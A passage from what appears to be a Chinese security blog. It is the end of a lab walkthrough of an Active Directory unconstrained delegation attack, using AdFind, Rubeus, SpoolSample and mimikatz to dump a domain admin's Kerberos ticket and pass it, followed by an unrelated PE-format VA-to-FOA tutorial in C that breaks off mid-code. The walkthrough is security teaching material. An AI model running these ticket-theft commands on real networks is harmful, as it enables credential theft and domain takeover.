<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adfind.exe -h 10.0.10.110 -u vulntarget\win2016 -up Admin#123 -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220108235703392.png" alt="image-20220108235703392"></p>
<p>无需密码查找域内非约束委派的主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>



<h4 id="机器账户的非约束委派攻击"><a href="#机器账户的非约束委派攻击" class="headerlink" title="机器账户的非约束委派攻击"></a>机器账户的非约束委派攻击</h4><p>首先在具备非约束委派攻击条件的域内机器执行Rubeus.exe监控登录操作，并实时转储TGT,（此操作需要本地管理员权限）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:<span class="number">1</span>  /filteruser:win2019$</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109000813844.png" alt="image-20220109000813844"></p>
<p>利用spoolsample项目使域控强制认证域机器抓取转储tgt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SpoolSample.exe win2019 win2016</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109003544258.png" alt="image-20220109003544258"></p>
<p>很遗憾，此处由于dc已是win2019 ，强制认证已经得到微软的修复，因此此处转储机器账户TGT失败。</p>
<p><code>**低版本域控强制认证成功案例待补充**</code></p>
<p>但再Win2019 以下如win2012 win2008等服务器内 ，使用spoolSample项目强制域控机认证域机器是有很大概率奏效的。</p>
<h4 id="域用户的非约束委派攻击"><a href="#域用户的非约束委派攻击" class="headerlink" title="域用户的非约束委派攻击"></a>域用户的非约束委派攻击</h4><p>倘若发现存在非约束委派的用户，这时，我们可以在域内所有可以登陆此用户的域内机器上尝试非约束委派攻击，获取其缓存的服务账号票据，并期望获得域控的票据。</p>
<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109225405402.png" alt="image-20220109225405402"></p>
<p>根据前文所用的adfind.exe ，我们可以发现，在win2016机器上，具有我们执行域用户的非约束委派攻击的条件</p>
<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109225908898.png" alt="image-20220109225908898"></p>
<p>此处为了演示效果，我们主动让域控对域内机器win2016发起认证</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Enter-PSSession -ComputerName win2016</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109230059651.png" alt="image-20220109230059651"></p>
<p>此时，在win2016机器内已经存储下来了域管账户的tgt票据。</p>
<p>在win2016机器内利用mimikatz转储票据(以管理员权限启动)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">kerberos::purge </span><br><span class="line">sekurlsa::tickets /exports</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109230735844.png" alt="image-20220109230735844"></p>
<p>可以看到转储成功，已拿到域管用户的tgt票据，接下来利用ptt hash传递，获得域管权限。</p>
<p>PTT之前，我们是无法通过Kerberos认证访问域控机的共享目录的</p>
<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109230941828.png" alt="image-20220109230941828"></p>
<p>利用mimikatz进行ptt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt [0;2c7f64]-2-0-60a10000-Administrator@krbtgt-VULNTARGET.COM.kirbi</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109231126642.png" alt="image-20220109231126642"></p>
<p>此时已成功执行！</p>
<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109231509139.png" alt="image-20220109231509139"></p>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>PE结构-VA与FOA的转化</title>
    <url>/2021/10/14/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96/</url>
    <content><![CDATA[<h3 id="VA转FOA"><a href="#VA转FOA" class="headerlink" title="VA转FOA"></a>VA转FOA</h3><p>相应名词概念</p>
<table>
<thead>
<tr>
<th></th>
<th>对应结构体成员</th>
<th>英文全称</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>VA</td>
<td>_IMAGE_SECTION_HEADER.VirtualAddress</td>
<td>Virtual Address</td>
<td>在内存中的虚拟地址</td>
</tr>
<tr>
<td>RVA</td>
<td>_IMAGE_SECTION_HEADER.VirtualAddress</td>
<td>Relative Virtual Address</td>
<td>相对虚拟地址</td>
</tr>
<tr>
<td>FOA</td>
<td>_IMAGE_SECTION_HEADER.PointerToRawData</td>
<td>File Offset Address</td>
<td>文件偏移地址</td>
</tr>
</tbody></table>
<span id="more"></span>

<h3 id="为什么需要学习VA与FOA之间的转换"><a href="#为什么需要学习VA与FOA之间的转换" class="headerlink" title="为什么需要学习VA与FOA之间的转换"></a>为什么需要学习VA与FOA之间的转换</h3><p>此处需要引入一个问题：<strong>如何改变一个全局变量的初始值</strong></p>
<ul>
<li>如果一个全局变量有<strong>初始值</strong>，那么他的初试值一定是存储于PE文件中的。</li>
<li>如果一个全局变量没有<strong>初始值</strong>，那么在PE文件中就没有存储它的位置，只有当PE文件加载到内存中时，才会给它分配空间</li>
</ul>
<p>修改程序的数据时，如果不懂的如何转换VA与FOA，我们在修改内存全局变量的时候就只能通过CE等辅助工具进行搜索修改了。</p>
<h3 id="全局变量初始值Demo"><a href="#全局变量初始值Demo" class="headerlink" title="全局变量初始值Demo"></a>全局变量初始值Demo</h3><p>利用c语言输出全局变量的值与地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> global = <span class="number">0x610</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//输出全局变量地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;address:%X\n&quot;</span>, &amp;global);</span><br><span class="line">    <span class="comment">//输出全局变量的值</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value:0x%X\n&quot;</span>, global);</span><br><span class="line">    <span class="comment">//暂停一下，防止窗口运行完自动关闭</span></span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014123921284.png" alt="image-20211014123921284"></p>
<p>可以看到程序将全局变量地址与值打印到了dos窗口之上</p>
<h3 id="修改全局变量的初始值"><a href="#修改全局变量的初始值" class="headerlink" title="修改全局变量的初始值"></a>修改全局变量的初始值</h3><p>注意，在调试的时候，要选择低版本windows 如windows 2008，高版本windows启用随机内存地址保护，不利于我们调试，一开始踩了这个大坑，又空耗了1个多小时….</p>
<p>此时我们可以看到在运行时，全局变量的地址为0A425A30</p>
<p>此时我们如果使用16进制编辑器去寻找这个地址，我们是无法发现全局变量的。</p>
<p>这是由于PE文件在载入内存中时的地址是虚拟地址（VA）</p>
<p>VA = ImageBase + RVA    </p>
<p>也就是说虚拟地址 = PE文件载入内存中后的基地址 + 相对虚拟地址（相对于基地址看齐）</p>
<p>而基地址是ImageBase字段的值，这点我们可以从PE头中获知</p>
<p>于是我们可以计算得出 RVA = VA - ImageBase</p>
<p>而其在PE文件中的地址为FOA（文件偏移地址）</p>
<p>最终问题就也就变成了 RVA与FOA的转换</p>
<p><strong>通俗点来讲，就是说假设我们通过运行程序拿到RVA，想要获知FOA，就需要通过一定手段利用RVA来获知FOA，从而定位到我们想要的一个函数或变量的地址</strong></p>
<h3 id="VA到FOA转换流程"><a href="#VA到FOA转换流程" class="headerlink" title="VA到FOA转换流程"></a>VA到FOA转换流程</h3><p>1.得到RVA的值： RVA = VA - ImageBase </p>
<p>2.判断RVA是否在PE文件头内</p>
<ul>
<li>如果在，则FOA=RVA</li>
<li>如果不在，判断RVA在哪个节（区块），差值 = RVA - 区块.virtualAddress(RVA),    FOA = 区块.PointerToRawData + 差值</li>
</ul>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014114852057.png" alt="image-20211014114852057"></p>
<h3 id="根据流程转换"><a href="#根据流程转换" class="headerlink" title="根据流程转换"></a>根据流程转换</h3><p><strong>1.拿到RVA的值： RVA = VA - ImageBase</strong></p>
<p>首先拿到ImageBase值</p>
<p>利用StudyPE来查看</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014124137197.png" alt="image-20211014124137197"></p>
<p>显然，ImageBase的值为00400000</p>
<p>于是可以算出 RVA = VA - ImageBase =  425a30h - 400000h = 25A30h</p>
<p><strong>2.判断RVA是否位于PE文件头之内</strong></p>
<p>可以看到PE文件头的地址在F7h处结尾，而25A30h远远大于，因此不在pe文件头处</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014125244591.png" alt="image-20211014125244591"></p>
<p>很显然，1F600已经超出了PE文件的最大范围，这证明我们定位的RVA ≠FOA</p>
<p>3.<strong>判断RVA属于那一节</strong></p>
<p>根据RVA &gt; = 区块.VirtualAddress </p>
<p>RVA &lt; 区块.VirtualAddress + 当前节内存对齐后</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">RVA&gt;=节.VirtualAddress</span><br><span class="line"></span><br><span class="line">RVA&lt;节.VirtualAddress + 当前节内存对齐后的大小=节.VirtualAddress +[(Max&#123;节.Misc，节.SizeOfRawData&#125;)÷SectionAlignment]向上取整×SectionAlignment</span><br></pre></td></tr></table></figure>

<ul>
<li>节.sizeOfRawData 是节文件对齐后的大小</li>
<li>节.Misc是节的实际大小</li>
</ul>
<p><strong>内存对齐后的大小 = [Max{实际的大小,文件对齐后的大小}÷内存对齐]向上取整×内存对齐</strong></p>
<p>向上取整的意思就是 如果除后的结果为整数就直接为结果，如果除后的结果带小数则取整然后加一</p>
<p>例子：[5÷2]向上取整= 2.5取整+1=2+1=3，[4÷2]向上取整=2</p>
<p>根据工具可知，RVA = 0X25A30 处于.idata区块之中 </p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014125443850.png" alt="image-20211014125443850"></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014130005638.png" alt="image-20211014130005638"></p>
<p>程序在内存中的对齐基数为SectionAlign设置的0x1000</p>
<p>其实际大小 = 区块.Misc 在 StudyPE中显示为V.Size = 0x5604</p>
<p>Max{节.Misc,节.SizeofRawData} = Max{0x5604,0x4000} = 0x5604</p>
<p>内存对齐后的大小 = {0x5604 / 内存对齐} 向上取整*内存对齐 = (0x5604/0x1000)向上取整 * 0x1000 = (5 + 1 ) * 0x1000 = 0x6000</p>
<p>RVA&gt;=0x25000</p>
<p>RVA&lt;0X25000 + 内存对齐后的大小 = 0x25000 + 0x6000 = 0x2A000</p>
<p>差值 = RVA - 节.VirtualAddress = 0x25A30 - 0X25000 = 0XA30</p>
<p>PointerToRawData 在工具中显示为Offset，为0X25000</p>
<p>FOA = 节.PointerToRawData + 差值 = 0x25000 + 0XA30= 0x25A30</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014131006511.png" alt="image-20211014131006511"></p>
<p>由此，找到了数值地址，进行修改为65535,再次运行，发现值已被修改.</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014131136540.png" alt="image-20211014131136540"></p>
<h3 id="利用代码实现VA转FOA"><a href="#利用代码实现VA转FOA" class="headerlink" title="利用代码实现VA转FOA"></a>利用代码实现VA转FOA</h3><p><strong>代码</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PE.cpp : Defines the entry point for the console application.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="comment">//在VC6这个比较旧的环境里，没有定义64位的这个宏，需要自己定义，在VS2019中无需自己定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_AMD64  0x8664</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 32位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa32</span><span class="params">(UINT va, _IMAGE_DOS_HEADER *dos,_IMAGE_NT_HEADERS* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew+<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd) &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);        </span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize ,(UINT)sectionArr[i]-&gt;SizeOfRawData ) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment)* nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory)) &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            <span class="keyword">int</span> offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            <span class="keyword">int</span> foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 64位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa64</span><span class="params">(UINT va, _IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS64* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd) &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);</span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize ,(UINT)sectionArr[i]-&gt;SizeOfRawData ) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment)* nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory)) &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            <span class="keyword">int</span> offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            <span class="keyword">int</span> foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//创建DOS对应的结构体指针</span></span><br><span class="line">    _IMAGE_DOS_HEADER* dos;</span><br><span class="line">    <span class="comment">//读取文件，返回文件句柄</span></span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFileA</span>(<span class="string">&quot;C:\\Users\\86156\\Desktop\\N1.exe&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//根据文件句柄创建映射</span></span><br><span class="line">    HANDLE hMap = <span class="built_in">CreateFileMappingA</span>(hFile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//映射内容</span></span><br><span class="line">    LPVOID pFile = <span class="built_in">MapViewOfFile</span>(hMap, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//类型转换，用结构体的方式来读取</span></span><br><span class="line">    dos = (_IMAGE_DOS_HEADER*)pFile;</span><br><span class="line">    <span class="comment">//输出dos-&gt;e_magic，以十六进制输出</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dos-&gt;e_magic:%X\n&quot;</span>, dos-&gt;e_magic);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向PE文件头标志的指针</span></span><br><span class="line">    DWORD* peId;</span><br><span class="line">    <span class="comment">//让PE文件头标志指针指向其对应的地址=DOS首地址+偏移</span></span><br><span class="line">    peId = (DWORD*)((UINT)dos + dos-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">//输出PE文件头标志，其值应为4550，否则不是PE文件</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;peId:%X\n&quot;</span>, *peId);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向可选PE头的第一个成员magic的指针</span></span><br><span class="line">    WORD* magic;</span><br><span class="line">    <span class="comment">//让magic指针指向其对应的地址=PE文件头标志地址+PE文件头标志大小+标准PE头大小</span></span><br><span class="line">    magic = (WORD*)((UINT)peId + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD) + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_FILE_HEADER));</span><br><span class="line">    <span class="comment">//输出magic，其值为0x10b代表32位程序，其值为0x20b代表64位程序</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;magic:%X\n&quot;</span>, *magic);</span><br><span class="line">    <span class="comment">//根据magic判断为32位程序还是64位程序</span></span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (*magic) &#123;</span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR32_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;32位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为32位程序后，就可以使用_IMAGE_NT_HEADERS来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS* nt;</span><br><span class="line">        <span class="comment">//让PE文件头指针指向其对应的地址</span></span><br><span class="line">        nt = (_IMAGE_NT_HEADERS*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**) <span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span>(cnt&lt; nt-&gt;FileHeader.NumberOfSections)&#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER)*cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">VaToFoa32</span>(<span class="number">0x4198B0</span>,dos, nt, sectionArr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR64_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;64位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为64位程序后，就可以使用_IMAGE_NT_HEADERS64来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS64* 